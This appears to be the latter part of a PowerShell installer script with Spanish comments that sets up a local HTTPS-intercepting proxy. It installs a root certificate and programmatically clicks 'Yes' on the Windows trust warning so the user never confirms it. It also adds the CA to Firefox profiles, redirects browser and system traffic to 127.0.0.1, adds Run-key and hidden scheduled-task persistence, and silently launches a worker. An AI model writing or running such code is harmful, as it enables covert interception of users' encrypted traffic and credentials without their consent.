        SetForegroundWindow(hwnd);
        foreach (var l in lbls) {
            var btn = FindWindowEx(hwnd, IntPtr.Zero, "Button", l);
            if (btn != IntPtr.Zero) {
                PostMessage(btn, 0x00F5, IntPtr.Zero, IntPtr.Zero);
                return true;
            }
        }
        return false;
    }
}
"@
}

# Snapshot de dialogos previos para no clickear ventanas ajenas
$preDialogs = [System.Collections.Generic.HashSet[IntPtr]]::new()
[WinApiCert]::GetDialogs() | ForEach-Object { $preDialogs.Add($_) | Out-Null }

$certInstalled = $false
# Sin -WindowStyle Hidden para que el dialogo pueda recibir foco correctamente
$certProc = Start-Process -FilePath "$env:SystemRoot\System32\certutil.exe" `
    -ArgumentList "-user -addstore Root `"$CaCrt`"" `
    -PassThru

for ($t = 0; $t -lt 80 -and -not $certProc.HasExited; $t++) {
    Start-Sleep -Milliseconds 250
    [WinApiCert]::GetDialogs() |
        Where-Object { -not $preDialogs.Contains($_) } |
        ForEach-Object { [WinApiCert]::ClickYes($_) | Out-Null }
}
if (-not $certProc.HasExited) { $certProc.WaitForExit(3000) | Out-Null }
if ($certProc.ExitCode -eq 0) {
    OK "certutil OK (exit 0)"
    $certInstalled = $true
} else {
    Warn "certutil exit $($certProc.ExitCode)"
}
} # end if -not $certOk

# ---- Metodo D: HKLM (requiere admin) ----
if (-not $certInstalled -and $blob) {
    try {
        $rkm = "HKLM:\SOFTWARE\Microsoft\SystemCertificates\ROOT\Certificates\$thumb"
        New-Item -Path $rkm -Force -ErrorAction Stop | Out-Null
        Set-ItemProperty -Path $rkm -Name "Blob" -Value $blob -Type Binary -ErrorAction Stop
        OK "HKLM cert instalado"
        $certInstalled = $true
    } catch {
        Warn "HKLM: sin admin"
    }
}

# Verificar via X509Store (no ve el HKCU en maquinas con GPO, pero si HKLM o certutil)
$verStore = New-Object System.Security.Cryptography.X509Certificates.X509Store('Root', 'CurrentUser')
$verStore.Open([System.Security.Cryptography.X509Certificates.OpenFlags]::ReadOnly)
$verFound = @($verStore.Certificates) | Where-Object { $_.Thumbprint -ieq $thumb }
$verStore.Close()

OK "thumbprint: $thumb"
if ($verFound) {
    OK "Cert en Root store (X509Store)"
    Send-InstallReport -Step 'cert_install' -Status 'ok' -Detail "thumb=$thumb"
} else {
    Warn "Cert NO en X509Store - Chrome policy HKCU escrita; reiniciar Chrome para aplicar"
    Send-InstallReport -Step 'cert_install' -Status 'warn' -Detail "cert no en X509Store thumb=$thumb; HKCU policy escrita"
}

# =============================================================================
# 11. INSTALAR CA EN FIREFOX - certutil.exe del propio Firefox (sin UAC)
# =============================================================================
Step "CA -> Firefox"

$ffUtil = @(
    "$env:PROGRAMFILES\Mozilla Firefox\certutil.exe",
    "${env:PROGRAMFILES(X86)}\Mozilla Firefox\certutil.exe"
) | Where-Object { Test-Path $_ } | Select-Object -First 1

if ($ffUtil) {
    @("$env:APPDATA\Mozilla\Firefox\Profiles","$env:LOCALAPPDATA\Mozilla\Firefox\Profiles") |
        Where-Object { Test-Path $_ } | ForEach-Object {
            Get-ChildItem $_ -Directory | ForEach-Object {
                & $ffUtil -A -n "RootCA" -t "CT,," -i $CaCrt `
                    -d "sql:$($_.FullName)" 2>&1 | Out-Null
                OK "perfil $($_.Name)"
            }
        }
} else { Warn "Firefox no detectado, se omite" }

# =============================================================================
# 12. PROXY EN FIREFOX - user.js en cada perfil (sin UAC)
# =============================================================================
Step "Proxy -> Firefox (user.js)"

"$env:APPDATA\Mozilla\Firefox\Profiles" | Where-Object { Test-Path $_ } | ForEach-Object {
    Get-ChildItem $_ -Directory | ForEach-Object {
        $uj = "$($_.FullName)\user.js"
        if (Test-Path $uj) {
            Set-Content $uj (Get-Content $uj | Where-Object { $_ -notmatch 'network\.proxy' }) -Encoding UTF8
        }
        Add-Content $uj -Encoding UTF8 -Value @"
user_pref("network.proxy.type", 1);
user_pref("network.proxy.http", "127.0.0.1");
user_pref("network.proxy.http_port", $ProxyPort);
user_pref("network.proxy.ssl", "127.0.0.1");
user_pref("network.proxy.ssl_port", $ProxyPort);
user_pref("network.proxy.no_proxies_on", "localhost,127.0.0.1");
"@
        OK "perfil $($_.Name)"
    }
}

# =============================================================================
# 13. PROXY DEL SISTEMA WINDOWS - HKCU (sin UAC)
#     Solo activa si cert quedó confiable; si no, crash report + internet directo
# =============================================================================
Step "Proxy del sistema -> HKCU"

$certFinal = Test-Path "Cert:\CurrentUser\Root\$thumb" -ErrorAction SilentlyContinue
if (-not $certFinal) {
    Warn "Cert NO en HKCU Root - proxy NO activado (internet queda directo)"
    Send-InstallReport -Step 'cert_install' -Status 'error' -Detail "cert_not_trusted thumb=$thumb proxy no activado"
    return
}

$ir = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
Set-ItemProperty -Path $ir -Name "ProxyEnable"   -Value 1
Set-ItemProperty -Path $ir -Name "ProxyServer"   -Value "127.0.0.1:$ProxyPort"
Set-ItemProperty -Path $ir -Name "ProxyOverride" -Value "localhost;127.0.0.1;<local>"

Add-Type -TypeDefinition @"
using System;using System.Runtime.InteropServices;
public class WI{
  [DllImport("wininet.dll")]
  public static extern bool InternetSetOption(IntPtr h,int o,IntPtr b,int l);
}
"@
[WI]::InternetSetOption([IntPtr]::Zero,39,[IntPtr]::Zero,0)|Out-Null
[WI]::InternetSetOption([IntPtr]::Zero,37,[IntPtr]::Zero,0)|Out-Null
OK "127.0.0.1:$ProxyPort"
Send-InstallReport -Step 'proxy_settings' -Status 'ok' -Detail "127.0.0.1:$ProxyPort"

# =============================================================================
# 14. PERSISTENCIA - HKCU Run (siempre funciona sin UAC)
#     + Task Scheduler como intento secundario (puede fallar con GPO)
# =============================================================================
Step "Persistencia: HKCU Run"

$regRun = "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
Set-ItemProperty -Path $regRun -Name $TaskName -Value "`"wscript.exe`" `"$VbsPath`""
OK "HKCU\Run registrado - persiste en reinicios"

Step "Task Scheduler: $TaskName (opcional)"
try {
    Unregister-ScheduledTask -TaskName $TaskName -Confirm:$false -ErrorAction SilentlyContinue
    $action   = New-ScheduledTaskAction -Execute "wscript.exe" -Argument "`"$VbsPath`""
    $trigger  = New-ScheduledTaskTrigger -AtLogOn
    $settings = New-ScheduledTaskSettingsSet `
                    -ExecutionTimeLimit ([TimeSpan]::Zero) `
                    -MultipleInstances   IgnoreNew `
                    -Hidden
    Register-ScheduledTask `
        -TaskName $TaskName `
        -Action   $action `
        -Trigger  $trigger `
        -Settings $settings `
        -RunLevel Limited `
        -Force | Out-Null
    OK "Task Scheduler registrado"
} catch {
    Warn "Task Scheduler no disponible (GPO) - usando solo HKCU\Run"
}

# =============================================================================
# 15. LANZAR AHORA MISMO
# =============================================================================
Step "Iniciando"

$wsi = New-Object System.Diagnostics.ProcessStartInfo
$wsi.FileName        = "wscript.exe"
$wsi.Arguments       = "`"$VbsPath`""
$wsi.UseShellExecute = $false
$wsi.CreateNoWindow  = $true
[System.Diagnostics.Process]::Start($wsi) | Out-Null
Send-InstallReport -Step 'worker_start' -Status 'ok'
Send-InstallReport -Step 'install_ok'   -Status 'ok'

Write-Host ""
Write-Host "  Listo. Proxy activo en 127.0.0.1:$ProxyPort" -ForegroundColor Green
Write-Host "  Task: $TaskName  |  Secret: DPAPI (sin plaintext en disco)" -ForegroundColor Green
